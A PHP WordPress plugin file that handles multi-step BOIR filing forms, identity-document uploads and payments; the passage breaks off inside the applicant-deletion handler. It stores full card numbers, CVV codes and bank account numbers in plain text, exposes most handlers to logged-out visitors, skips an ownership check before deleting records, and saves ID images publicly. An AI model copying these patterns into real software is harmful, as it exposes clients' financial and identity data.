<?php

use function ElementorDeps\DI\get;

function generateRandomString($length = 10) {
    global $wpdb;
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    $fillings_table = $wpdb->prefix . "boir_clients_fillings";
    $check_filling_code = $wpdb->get_var($wpdb->prepare(
        "SELECT filling_code FROM $fillings_table WHERE filling_code = %s",
        $randomString
    ));
    if ($check_filling_code) {
        return generateRandomString($length);
    }
    return $randomString;
}


add_action('wp_ajax_boir_form1', 'boir_handle_form1');
add_action('wp_ajax_nopriv_boir_form1', 'boir_handle_form1');

function boir_handle_form1() {
    global $wpdb;

    $filling_id = sanitize_text_field($_POST['filling_id']) ?? '';
    
    if (!is_user_logged_in()) {

        $name = sanitize_text_field($_POST['client_name']);
        $email = sanitize_email($_POST['client_email']);


        if (!is_email($email)) {
            wp_send_json_error("Invalid email address.");
        }

        $user = get_user_by('email', $email);
        if (!$user) {
            // Create new user
            $password = wp_generate_password(); // Generate a random password
            $user_id = wp_create_user($email, $password, $email);

            if (is_wp_error($user_id)) {
                wp_send_json_error("User creation failed: " . $user_id->get_error_message());
            }

            // Update user meta with the provided name
            wp_update_user([
                'ID' => $user_id,
                'display_name' => $name,
                'first_name' => $name,
                'role' => 'Customer'
            ]);

            update_user_meta($user_id, 'show_admin_bar_front', 'false');

            // Optionally send the password to the user's email
            /*wp_mail(
                $email,
                "Your New Account",
                "Your account has been created. <br> Login URL: <a href='" . site_url("/signin") . "'>" . site_url("/signin") . "</a> <br> Username: $email<br> Password: $password",
                array('Content-Type: text/html; charset=UTF-8')
            );*/
        } else {
            wp_send_json_error("User already exists. Please log in.");
            // $user_id = $user->ID;
            return;
        }
        
        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id);

        $data = create_new_filling_Fn($user_id, $filling_id);

        wp_send_json_success(array('user_id' => $user_id, 'client_id' => $data['client_id'], 'filling_id' => $data['filling_id'], 'filling_code' => $data['filling_code'], 'current_page_url' => $_POST['current_page_url']));
    
    }else{
        $data = create_new_filling_Fn(get_current_user_id(), $filling_id);
        wp_send_json_success(array('user_id' => get_current_user_id(), 'client_id' => $data['client_id'], 'filling_id' => $data['filling_id'], 'filling_code' => $data['filling_code'], 'current_page_url' => $_POST['current_page_url']));
    }
}

function create_new_filling_Fn($user_id, $filling_id = ''){
    global $wpdb;

    $clients_table = $wpdb->prefix . "boir_clients";
    $check_client = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $clients_table WHERE user_id = %d",
        $user_id
    ));

    if (!$check_client) {
        $wpdb->insert(
            $clients_table,
            array(
                'user_id' => $user_id,
                'client_name' => sanitize_text_field($_POST['client_name']),
                'client_email' => sanitize_email($_POST['client_email']),
                'client_phone' => sanitize_text_field($_POST['client_phone']),
                'client_conversion_from' => $_POST['current_page_url']
            ),
            array('%d', '%s', '%s', '%s', '%s') 
        );

        $client_id = $wpdb->insert_id;
    }else{
        $client_id = $check_client;
    }



    $fillings_table = $wpdb->prefix . "boir_clients_fillings";
    $fillings_inital_data_table = $wpdb->prefix . "boir_fillings_inital_data";

    if ($filling_id!='') {

        $check_filling = $wpdb->get_row($wpdb->prepare(
            "SELECT id, filling_code FROM $fillings_table WHERE id = %d AND client_id = %d",
            $filling_id,
            $client_id
        ));

        if (!$check_filling) {
            $filling_code = generateRandomString(20);
            $wpdb->insert(
                $fillings_table,
                array(
                    'client_id' => $client_id,
                    'client_fincen_id' => $_POST['client_fincen_id'],
                    'filling_code' => $filling_code,
                    'filling_status' => 1
                ),
                array('%d', '%d', '%s', '%d') 
            );

            $filling_id = $wpdb->insert_id;
        }else{
            $filling_id = $check_filling->id;
            $filling_code = $check_filling->filling_code;
            $wpdb->update(
                $fillings_table,
                array(
                    'client_fincen_id' => sanitize_text_field($_POST['client_fincen_id']),
                    'filling_status' => "1"
                ),
                array('id' => $filling_id),
                array('%d', '%d')
            );
        }
    }else{
        $filling_code = generateRandomString(20);
        $wpdb->insert(
            $fillings_table,
            array(
                'client_id' => $client_id,
                'client_fincen_id' => $_POST['client_fincen_id'],
                'filling_code' => $filling_code,
                'filling_status' => 1
            ),
            array('%d', '%d', '%s', '%d') 
        );

        $filling_id = $wpdb->insert_id;
    }

    $check_initial_data = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $fillings_inital_data_table WHERE filling_id = %d",
        $filling_id
    ));

    if (!$check_initial_data) {
        $wpdb->insert(
            $fillings_inital_data_table,
            array(
                'client_id' => $client_id,
                'filling_id' => $filling_id,
                'initial_legal_name' => sanitize_text_field($_POST['client_legal_name']),
                'initial_alternate_name' => sanitize_text_field($_POST['client_alternate_name']),
                'initial_tax_type' => sanitize_text_field($_POST['client_tax_type']),
                'initial_tax_number' => sanitize_text_field($_POST['client_tax_number'])
            ),
            array('%d', '%d', '%s', '%s', '%s', '%s') 
        );

        $initial_data_id = $wpdb->insert_id;
    }else{
        $initial_data_id = $check_initial_data;
        $wpdb->update(
            $fillings_inital_data_table,
            array(
                'initial_legal_name' => sanitize_text_field($_POST['client_legal_name']),
                'initial_alternate_name' => sanitize_text_field($_POST['client_alternate_name']),
                'initial_tax_type' => sanitize_text_field($_POST['client_tax_type']),
                'initial_tax_number' => sanitize_text_field($_POST['client_tax_number'])
            ),
            array('id' => $initial_data_id),
            array('%s', '%s', '%s', '%s'),
            array('%d')
        );
    }

    $return_data = array(
        'client_id' => $client_id,
        'filling_id' => $filling_id,
        'filling_code' => $filling_code
    );
    return $return_data;
}

add_action('wp_ajax_boir_form2', 'boir_handle_form2');
add_action('wp_ajax_nopriv_boir_form2', 'boir_handle_form2');

function boir_handle_form2() {
    global $wpdb;

    $filling_id_post = sanitize_text_field($_POST['filling_id']);

    $user_id = get_current_user_id();
    $clients_table = $wpdb->prefix . "boir_clients";
    $client_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $clients_table WHERE user_id = %d",
        $user_id
    ));

    if (!$client_id) {
        wp_send_json_error("Something went wrong with your filling, please contact support.");
        return;
    }

    $fillings_table = $wpdb->prefix . "boir_clients_fillings";

    if($filling_id_post=='') {
        wp_send_json_error("Something went wrong with your filling, please contact support.");
        return;
    }

    $filling_status = 1;

    $filling_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $fillings_table WHERE id = %d AND client_id = %d AND filling_status = %d",
        $filling_id_post, $client_id, $filling_status
    ));

    if (!$filling_id) {
        wp_send_json_error("Something went wrong with your filling, please contact support.");
        return;
    }

    $fillings_jurisdiction_data_table = $wpdb->prefix . "boir_fillings_jurisdiction_data";
    
    $check_jurisdiction_data = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $fillings_jurisdiction_data_table WHERE filling_id = %d",
        $filling_id
    ));

    if (!$check_jurisdiction_data) {
        $wpdb->insert(
            $fillings_jurisdiction_data_table,
            array(
                'client_id' => $client_id,
                'filling_id' => $filling_id,
                'juri_formation_country' => sanitize_text_field($_POST['juri_formation_country']),
                'juri_formation_state' => sanitize_text_field($_POST['juri_formation_state']),
                'juri_tribal' => sanitize_text_field($_POST['juri_tribal']),
                'juri_address_line_1' => sanitize_text_field($_POST['juri_address_line_1']),
                'juri_address_line_2' => sanitize_text_field($_POST['juri_address_line_2']),
                'juri_city' => sanitize_text_field($_POST['juri_city']),
                'juri_state' => sanitize_text_field($_POST['juri_state']),
                'juri_zip' => sanitize_text_field($_POST['juri_zip']),
            ),
            array('%d', '%d', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s') 
        );
    }else{
        $wpdb->update(
            $fillings_jurisdiction_data_table,
            array(
                'juri_formation_country' => sanitize_text_field($_POST['juri_formation_country']),
                'juri_formation_state' => sanitize_text_field($_POST['juri_formation_state']),
                'juri_tribal' => sanitize_text_field($_POST['juri_tribal']),
                'juri_address_line_1' => sanitize_text_field($_POST['juri_address_line_1']),
                'juri_address_line_2' => sanitize_text_field($_POST['juri_address_line_2']),
                'juri_city' => sanitize_text_field($_POST['juri_city']),
                'juri_state' => sanitize_text_field($_POST['juri_state']),
                'juri_zip' => sanitize_text_field($_POST['juri_zip']),
            ),
            array('filling_id' => $filling_id),
            array('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s'),
            array('%d')
        );
    }

    $wpdb->update(
        $fillings_table,
        array(
            'filling_status' => '1'
        ),
        array(
            'id' => intval($filling_id)
        ),
        array(
            '%s'
        ),
        array(
            '%d'
        )
    );

    wp_send_json_success(array('user_id' => $user_id));
}


add_action('wp_ajax_boir_form3', 'boir_handle_form3');
add_action('wp_ajax_nopriv_boir_form3', 'boir_handle_form3');

function boir_handle_form3() {
    global $wpdb;

    $clients_table = $wpdb->prefix . "boir_clients";
    $fillings_table = $wpdb->prefix . "boir_clients_fillings";
    $fillings_company_applicants_table = $wpdb->prefix . "boir_fillings_company_applicants";

    $user_id = get_current_user_id();
    $client_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $clients_table WHERE user_id = %d",
        $user_id
    ));

    if (!$client_id) {
        wp_send_json_error("Client not found.");
        return;
    }

    $filling_status = 1;

    $filling_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $fillings_table WHERE client_id = %d AND filling_status = %d",
        $client_id, $filling_status
    ));

    if (!$filling_id) {
        wp_send_json_error("Filling not found.");
        return;
    }

    $existing_reporting_company = sanitize_text_field($_POST['existing_company']);

    if($existing_reporting_company == "yes") {
        $check_company_applicant = $wpdb->get_var($wpdb->prepare(
            "SELECT id FROM $fillings_company_applicants_table WHERE filling_id = %d",
            $filling_id
        ));

        if (!$check_company_applicant) {
            wp_send_json_success(array('status' => 'false'));
            return;
        }

        
    }
    $wpdb->update(
        $fillings_table,
        array(
            'existing_reporting_company' => $existing_reporting_company,
            'filling_status' => '1'
        ),
        array(
            'id' => $filling_id
        ),
        array(
            '%s',
            '%s'
        ),
        array(
            '%d'
        )
    );

    wp_send_json_success(array('status' => 'true'));
}


add_action('wp_ajax_boir_form4', 'boir_handle_form4');
add_action('wp_ajax_nopriv_boir_form4', 'boir_handle_form4');

function boir_handle_form4() {
    global $wpdb;

    $clients_table = $wpdb->prefix . "boir_clients";
    $fillings_table = $wpdb->prefix . "boir_clients_fillings";
    $fillings_beneficial_owners_table = $wpdb->prefix . "boir_fillings_beneficial_owners";

    $user_id = get_current_user_id();
    $client_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $clients_table WHERE user_id = %d",
        $user_id
    ));

    if (!$client_id) {
        wp_send_json_error("Client not found.");
        return;
    }
    
    $filling_status = 1;

    $filling_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $fillings_table WHERE client_id = %d AND filling_status = %d",
        $client_id, $filling_status
    ));

    if (!$filling_id) {
        wp_send_json_error("Filling not found.");
        return;
    }

    $check_beneficial_owners = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $fillings_beneficial_owners_table WHERE filling_id = %d",
        $filling_id
    ));

    if (!$check_beneficial_owners) {
        wp_send_json_success(array('status' => 'false'));
        return;
    }

    $wpdb->update(
        $fillings_table,
        array(
            'filling_status' => '1'
        ),
        array(
            'id' => intval($filling_id)
        ),
        array(
            '%s'
        ),
        array(
            '%d'
        )
    );

    wp_send_json_success(array('status' => 'true'));
}



add_action('wp_ajax_boir_form5', 'boir_handle_form5');
add_action('wp_ajax_nopriv_boir_form5', 'boir_handle_form5');

function boir_handle_form5() {
    global $wpdb;

    $clients_table = $wpdb->prefix . "boir_clients";
    $fillings_table = $wpdb->prefix . "boir_clients_fillings";
    $fillings_company_applicants_table = $wpdb->prefix . "boir_fillings_company_applicants";
    $fillings_beneficial_owners_table = $wpdb->prefix . "boir_fillings_beneficial_owners";
    $fillings_payments_table = $wpdb->prefix . "boir_fillings_payments";

    $user_id = get_current_user_id();
    $client_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $clients_table WHERE user_id = %d",
        $user_id
    ));

    if (!$client_id) {
        wp_send_json_error("Client not found.");
        return;
    }

    $filling_status = 1;

    $filling_data = $wpdb->get_row($wpdb->prepare(
        "SELECT * FROM $fillings_table WHERE client_id = %d AND filling_status = %d",
        $client_id, $filling_status
    ));

    if (!$filling_data) {
        wp_send_json_error("Filling not found.");
        return;
    }

    $filling_id = $filling_data->id;
    $existing_reporting_company = $filling_data->existing_reporting_company;

    if($existing_reporting_company == "yes") {
        $check_company_applicant = $wpdb->get_var($wpdb->prepare(
            "SELECT id FROM $fillings_company_applicants_table WHERE filling_id = %d",
            $filling_id
        ));
    
        if (!$check_company_applicant) {
            wp_send_json_success(array('status' => 'false', 'message' => 'Company applicant not found.'));
            return;
        }
    }

    $check_beneficial_owners = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $fillings_beneficial_owners_table WHERE filling_id = %d",
        $filling_id
    ));

    if (!$check_beneficial_owners) {
        wp_send_json_success(array('status' => 'false', 'message' => 'Beneficial owners not found.'));
        return;
    }

    $filling_authorization = sanitize_text_field($_POST['filling_authorization']);

    if ($filling_authorization != '1') {
        wp_send_json_success(array('status' => 'false', 'message' => 'Please certify that you have review your fillings and the information is correct.'));
        return;
    }

    $filling_payments_check = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $fillings_payments_table WHERE filling_id = %d",
        $filling_id
    ));

    if ($filling_payments_check) {
        $filling_status = 2;
        sendBoirPayload($filling_id);
    }else{
        $filling_status = 1;
    }
    
    $wpdb->update(
        $fillings_table,
        array(
            'filling_authorization' => $filling_authorization,
            'filling_status' => $filling_status
        ),
        array(
            'id' => $filling_id
        ),
        array(
            '%s',
            '%s'
        ),
        array(
            '%d'
        )
    );
    wp_send_json_success(array('status' => 'true', 'filling_payment_status' => $filling_status));
}


add_action('wp_ajax_boir_form6', 'boir_handle_form6');
add_action('wp_ajax_nopriv_boir_form6', 'boir_handle_form6');

function boir_handle_form6() {
    global $wpdb;

    $clients_table = $wpdb->prefix . "boir_clients";
    $fillings_table = $wpdb->prefix . "boir_clients_fillings";
    $fillings_company_applicants_table = $wpdb->prefix . "boir_fillings_company_applicants";
    $fillings_beneficial_owners_table = $wpdb->prefix . "boir_fillings_beneficial_owners";
    $fillings_payments_table = $wpdb->prefix . "boir_fillings_payments";

    $user_id = get_current_user_id();
    $client_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $clients_table WHERE user_id = %d",
        $user_id
    ));

    if (!$client_id) {
        wp_send_json_error("Client not found.");
        return;
    }

    $filling_status = 1;

    $filling_data = $wpdb->get_row($wpdb->prepare(
        "SELECT * FROM $fillings_table WHERE client_id = %d AND filling_status = %d",
        $client_id, $filling_status
    ));

    if (!$filling_data) {
        wp_send_json_error("Filling not found.");
        return;
    }

    $filling_id = $filling_data->id;
    $existing_reporting_company = $filling_data->existing_reporting_company;

    if($existing_reporting_company == "yes") {
        $check_company_applicant = $wpdb->get_var($wpdb->prepare(
            "SELECT id FROM $fillings_company_applicants_table WHERE filling_id = %d",
            $filling_id
        ));
    
        if (!$check_company_applicant) {
            wp_send_json_success(array('status' => 'false', 'message' => 'Company applicant not found.'));
            return;
        }
    }

    $check_beneficial_owners = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $fillings_beneficial_owners_table WHERE filling_id = %d",
        $filling_id
    ));

    if (!$check_beneficial_owners) {
        wp_send_json_success(array('status' => 'false', 'message' => 'Beneficial owners not found.'));
        return;
    }

	    
	$payment_card_holder = sanitize_text_field($_POST['card_holder']);
	$transaction_id = sanitize_text_field($_POST['transaction_id']);
    $payment_type = sanitize_text_field($_POST['payment_type']);
    $payment_authorization = sanitize_text_field($_POST['payment_authorization']);
    $card_number = sanitize_text_field($_POST['card_number']);
    $exp_date = sanitize_text_field($_POST['exp_date']);
    $cvv = sanitize_text_field($_POST['cvv']);
    $card_country = sanitize_text_field($_POST['card_country']);
    $card_zip = sanitize_text_field($_POST['card_zip']);
    $routing_number = sanitize_text_field($_POST['routing_number']);
    $account_number = sanitize_text_field($_POST['account_number']);
    $user_agent = sanitize_text_field($_POST['user_agent']);
    $user_browser = sanitize_text_field($_POST['user_browser']);
    $user_ip = getClientIp();

    $check_payments = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $fillings_payments_table WHERE filling_id = %d",
        $filling_id
    ));

    if (!$check_payments) {
        $wpdb->insert(
            $fillings_payments_table,
            array(
                'client_id' => $client_id,
                'filling_id' => $filling_id,
                'payment_type' => $payment_type,
				'payment_card_holder' => $payment_card_holder,
				'transaction_id' => $transaction_id,
                'payment_authorization' => $payment_authorization,
                'card_number' => $card_number,
                'exp_date' => $exp_date,
                'cvv' => $cvv,
                'card_country' => $card_country,
                'card_zip' => $card_zip,
                'routing_number' => $routing_number,
                'account_number' => $account_number,
                'user_agent' => $user_agent,
                'user_browser' => $user_browser,
                'user_ip' => $user_ip
            )
        );
    } else {
        $wpdb->update(
            $fillings_payments_table,
            array(
                'payment_type' => $payment_type,				
				'transaction_id' => $transaction_id,
                'payment_authorization' => $payment_authorization,
				'payment_card_holder' => $payment_card_holder,
                'card_number' => $card_number,
                'exp_date' => $exp_date,
                'cvv' => $cvv,
                'card_country' => $card_country,
                'card_zip' => $card_zip,
                'routing_number' => $routing_number,
                'account_number' => $account_number,
                'user_agent' => $user_agent,
                'user_browser' => $user_browser,
                'user_ip' => $user_ip
            ),
            array(
                'filling_id' => intval($filling_id)
            ),
            array(
                '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s'
            ),
            array(
                '%d'
            )
        );
    }

    // SET FILLING STATUS TO PAID

    $wpdb->update(
        $fillings_table,
        array(
            'filling_status' => '2'
        ),
        array(
            'id' => intval($filling_id)
        ),
        array(
            '%s'
        ),
        array(
            '%d'
        )
    );
    $return = sendBoirPayload($filling_id);
    if($return)
        wp_send_json_success(array('status' => 'true', 'filing_id' => $filling_id));
    else
        wp_send_json_success(array('status' => 'false', 'message' => 'failed to process the BOIR data.'));
}

add_action('wp_ajax_boir_form3x_image', 'boir_handle_form3x_image');
add_action('wp_ajax_nopriv_boir_form3x_image', 'boir_handle_form3x_image');

function boir_handle_form3x_image() {
    // Check for the uploaded file
    if (!isset($_FILES['applicant_id_image']) || empty($_FILES['applicant_id_image']['tmp_name'])) {
        wp_send_json_error("No file uploaded or an error occurred during upload.");
        return;
    }

    $file = $_FILES['applicant_id_image'];
    $file_name = $file['name'];
    $file_tmp = $file['tmp_name'];
    $file_size = $file['size'];

    // Validate file extension
    $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);
    $file_ext = strtolower($file_ext);
    $allowed = array('jpg', 'jpeg', 'png', 'pdf');

    if (!in_array($file_ext, $allowed)) {
        wp_send_json_error("Invalid file type. Only JPG, JPEG, PNG and PDF files are allowed.");
        return;
    }

    // Validate file size
    if ($file_size > 5000000) { // 5 MB limit
        wp_send_json_error("File size exceeds the 5MB limit.");
        return;
    }

    // Generate a unique file name and upload to WordPress upload folder
    $file_name_new = uniqid('applicant_id_', true) . '.' . $file_ext;
    $upload_dir = wp_upload_dir();
    $file_path = $upload_dir['path'] . '/' . $file_name_new;
    $file_url = $upload_dir['url'] . '/' . $file_name_new;

    if (move_uploaded_file($file_tmp, $file_path)) {
        wp_send_json_success(array('file_path' => $file_url));
    } else {
        wp_send_json_error("Failed to upload the file. Please try again.");
    }
}


add_action('wp_ajax_boir_form4x_image', 'boir_handle_form4x_image');
add_action('wp_ajax_nopriv_boir_form4x_image', 'boir_handle_form4x_image');

function boir_handle_form4x_image() {
    // Check for the uploaded file

    if(isset($_POST['owner_exemption']) && $_POST['owner_exemption'] == '1') {
        wp_send_json_success("No file needed.");
        return;
    }

    if (!isset($_FILES['owner_id_image']) || empty($_FILES['owner_id_image']['tmp_name'])) {
        wp_send_json_error("No file uploaded or an error occurred during upload.");
        return;
    }

    $file = $_FILES['owner_id_image'];
    $file_name = $file['name'];
    $file_tmp = $file['tmp_name'];
    $file_size = $file['size'];

    // Validate file extension
    $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);
    $file_ext = strtolower($file_ext);
    $allowed = array('jpg', 'jpeg', 'png', 'pdf');

    if (!in_array($file_ext, $allowed)) {
        wp_send_json_error("Invalid file type. Only JPG, JPEG, PNG and PDF files are allowed.");
        return;
    }

    // Validate file size
    if ($file_size > 5000000) { // 5 MB limit
        wp_send_json_error("File size exceeds the 5MB limit.");
        return;
    }

    // Generate a unique file name and upload to WordPress upload folder
    $file_name_new = uniqid('owner_id_', true) . '.' . $file_ext;
    $upload_dir = wp_upload_dir();
    $file_path = $upload_dir['path'] . '/' . $file_name_new;
    $file_url = $upload_dir['url'] . '/' . $file_name_new;

    if (move_uploaded_file($file_tmp, $file_path)) {
        wp_send_json_success(array('file_path' => $file_url));
    } else {
        wp_send_json_error("Failed to upload the file. Please try again.");
    }
}

add_action('wp_ajax_boir_form3x', 'boir_handle_form3x');
add_action('wp_ajax_nopriv_boir_form3x', 'boir_handle_form3x');

function boir_handle_form3x() {
    global $wpdb;

    $clients_table = $wpdb->prefix . "boir_clients";
    $fillings_table = $wpdb->prefix . "boir_clients_fillings";
    $fillings_company_applicants_table = $wpdb->prefix . "boir_fillings_company_applicants";

    $user_id = get_current_user_id();
    $client_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $clients_table WHERE user_id = %d",
        $user_id
    ));

    if (!$client_id) {
        wp_send_json_error("Client not found.");
        return;
    }
    

    $filling_status = 1;

    $filling_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $fillings_table WHERE client_id = %d AND filling_status = %d",
        $client_id, $filling_status
    ));

    if (!$filling_id) {
        wp_send_json_error("Filling not found.");
        return;
    }

    $existing_reporting_company = "yes";
    $wpdb->update(
        $fillings_table,
        array(
            'existing_reporting_company' => $existing_reporting_company,
        ),
        array('id' => $filling_id),
        array('%s'),
        array('%d')
    );


    $wpdb->insert(
        $fillings_company_applicants_table,
        array(
            'client_id' => $client_id,
            'filling_id' => $filling_id,
            'applicant_last_name' => sanitize_text_field($_POST['applicant_last_name']),
            'applicant_first_name' => sanitize_text_field($_POST['applicant_first_name']),
            'applicant_middle_name' => sanitize_text_field($_POST['applicant_middle_name']),
            'applicant_suffix' => sanitize_text_field($_POST['applicant_suffix']),
            'applicant_dob' => sanitize_text_field($_POST['applicant_dob']),
            'applicant_address_type' => sanitize_text_field($_POST['applicant_address_type']),
            'applicant_address' => sanitize_text_field($_POST['applicant_address']),
            'applicant_city' => sanitize_text_field($_POST['applicant_city']),
            'applicant_country' => sanitize_text_field($_POST['applicant_country']),
            'applicant_state' => sanitize_text_field($_POST['applicant_state']),
            'applicant_zip' => sanitize_text_field($_POST['applicant_zip']),
            'applicant_id_image' => sanitize_text_field($_POST['applicant_id_image']),
            'applicant_id_type' => sanitize_text_field($_POST['applicant_id_type']),
            'applicant_id_number' => sanitize_text_field($_POST['applicant_id_number']),
            'applicant_id_country' => sanitize_text_field($_POST['applicant_id_country']),
            'applicant_id_state' => sanitize_text_field($_POST['applicant_id_state']),
            'applicant_id_tribal_jurisdiction' => sanitize_text_field($_POST['applicant_id_tribal_jurisdiction']),
        ),
        array('%d', '%d', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s') 
    );

    $company_applicant_id = $wpdb->insert_id;

    $_POST['id'] = $company_applicant_id;
    wp_send_json_success($_POST);
}

add_action('wp_ajax_boir_form4x', 'boir_handle_form4x');
add_action('wp_ajax_nopriv_boir_form4x', 'boir_handle_form4x');

function boir_handle_form4x() {
    global $wpdb;

    $clients_table = $wpdb->prefix . "boir_clients";
    $fillings_table = $wpdb->prefix . "boir_clients_fillings";
    $fillings_beneficial_owners_table = $wpdb->prefix . "boir_fillings_beneficial_owners";

    $user_id = get_current_user_id();
    $client_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $clients_table WHERE user_id = %d",
        $user_id
    ));

    if (!$client_id) {
        wp_send_json_error("Client not found.");
        return;
    }

    $filling_status = 1;

    $filling_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $fillings_table WHERE client_id = %d AND filling_status = %d",
        $client_id, $filling_status
    ));

    if (!$filling_id) {
        wp_send_json_error("Filling not found.");
        return;
    }

    if($_POST['owner_exemption'] == '0') {
        $post_array = array(
            'client_id' => $client_id,
            'filling_id' => $filling_id,
            'owner_is_minor' => sanitize_text_field($_POST['owner_is_minor']),
            'owner_exemption' => sanitize_text_field($_POST['owner_exemption']),
            'owner_last_name' => sanitize_text_field($_POST['owner_last_name']),
            'owner_first_name' => sanitize_text_field($_POST['owner_first_name']),
            'owner_middle_name' => sanitize_text_field($_POST['owner_middle_name']),
            'owner_suffix' => sanitize_text_field($_POST['owner_suffix']),
            'owner_dob' => sanitize_text_field($_POST['owner_dob']),
            'owner_address_type' => sanitize_text_field($_POST['owner_address_type']),
            'owner_address' => sanitize_text_field($_POST['owner_address']),
            'owner_city' => sanitize_text_field($_POST['owner_city']),
            'owner_country' => sanitize_text_field($_POST['owner_country']),
            'owner_state' => sanitize_text_field($_POST['owner_state']),
            'owner_zip' => sanitize_text_field($_POST['owner_zip']),
            'owner_id_image' => sanitize_text_field($_POST['owner_id_image']),
            'owner_id_type' => sanitize_text_field($_POST['owner_id_type']),
            'owner_id_number' => sanitize_text_field($_POST['owner_id_number']),
            'owner_id_country' => sanitize_text_field($_POST['owner_id_country']),
            'owner_id_state' => sanitize_text_field($_POST['owner_id_state']),
            'owner_id_tribal_jurisdiction' => sanitize_text_field($_POST['owner_id_tribal_jurisdiction']),
        );
        $post_format = array('%d', '%d', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s');
    } else {
        $post_array = array(
            'client_id' => $client_id,
            'filling_id' => $filling_id,
            'owner_is_minor' => sanitize_text_field($_POST['owner_is_minor']),
            'owner_exemption' => sanitize_text_field($_POST['owner_exemption']),
            'owner_last_name' => sanitize_text_field($_POST['owner_last_name']),
        );
        $post_format = array('%d', '%d', '%s', '%s', '%s');
    }

    $wpdb->insert(
        $fillings_beneficial_owners_table,
        $post_array,
        $post_format
    );

    $beneficial_owner_id = $wpdb->insert_id;

    $_POST['id'] = $beneficial_owner_id;
    wp_send_json_success($_POST);
}


add_action('wp_ajax_boir_get_applicants', 'boir_handle_get_applicants');
add_action('wp_ajax_nopriv_boir_get_applicants', 'boir_handle_get_applicants');

function boir_handle_get_applicants() {
    global $wpdb;

    $clients_table = $wpdb->prefix . "boir_clients";
    $fillings_table = $wpdb->prefix . "boir_clients_fillings";
    $fillings_company_applicants_table = $wpdb->prefix . "boir_fillings_company_applicants";

    $user_id = get_current_user_id();
    $client_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $clients_table WHERE user_id = %d",
        $user_id
    ));

    if (!$client_id) {
        wp_send_json_error("Client not found.");
        return;
    }

    $filling_status = 1;

    $filling_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $fillings_table WHERE client_id = %d AND filling_status = %d",
        $client_id, $filling_status
    ));

    if (!$filling_id) {
        wp_send_json_error("Filling not found.");
        return;
    }

    $company_applicants = $wpdb->get_results($wpdb->prepare(
        "SELECT * FROM $fillings_company_applicants_table WHERE filling_id = %d",
        $filling_id
    ));

    wp_send_json_success(array('company_applicants' => $company_applicants));
}

add_action('wp_ajax_boir_get_owners', 'boir_handle_get_owners');
add_action('wp_ajax_nopriv_boir_get_owners', 'boir_handle_get_owners');

function boir_handle_get_owners() {
    global $wpdb;

    $clients_table = $wpdb->prefix . "boir_clients";
    $fillings_table = $wpdb->prefix . "boir_clients_fillings";
    $fillings_beneficial_owners_table = $wpdb->prefix . "boir_fillings_beneficial_owners";

    $user_id = get_current_user_id();
    $client_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $clients_table WHERE user_id = %d",
        $user_id
    ));

    if (!$client_id) {
        wp_send_json_error("Client not found.");
        return;
    }

    $filling_status = 1;

    $filling_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $fillings_table WHERE client_id = %d AND filling_status = %d",
        $client_id, $filling_status
    ));

    if (!$filling_id) {
        wp_send_json_error("Filling not found.");
        return;
    }

    $beneficial_owners = $wpdb->get_results($wpdb->prepare(
        "SELECT * FROM $fillings_beneficial_owners_table WHERE filling_id = %d",
        $filling_id
    ));

    wp_send_json_success(array('beneficial_owners' => $beneficial_owners));
}


add_action('wp_ajax_boir_delete_applicant', 'boir_handle_delete_applicant');
add_action('wp_ajax_nopriv_boir_delete_applicant', 'boir_handle_delete_applicant');

function boir_handle_delete_applicant() {
    global $wpdb;

    $clients_table = $wpdb->prefix . "boir_clients";
    $fillings_table = $wpdb->prefix . "boir_clients_fillings";
    $fillings_company_applicants_table = $wpdb->prefix . "boir_fillings_company_applicants";

    $user_id = get_current_user_id();
    $client_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $clients_table WHERE user_id = %d",
        $user_id
    ));

    if (!$client_id) {
        wp_send_json_error("Client not found.");
        return;
    }

    $filling_id = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM $fillings_table WHERE client_id = %d",
        $client_id
    ));

    if (!$filling_id) {
        wp_send_json_error("Filling not found.");
        return;
    }

    $company_applicant_id = intval($_POST['id']);

    $company_applicant = $wpdb->get_row($wpdb->prepare(
        "SELECT * FROM $fillings_company_applicants_table WHERE id = %d",
        $company_applicant_id
    ));
    if ($company_applicant) {
        $file_url = $company_applicant->applicant_id_image;
        $file_path = str_replace(wp_upload_dir()['baseurl'], wp_upload_dir()['basedir'], $file_url);
        if (file_exists($file_path)) {
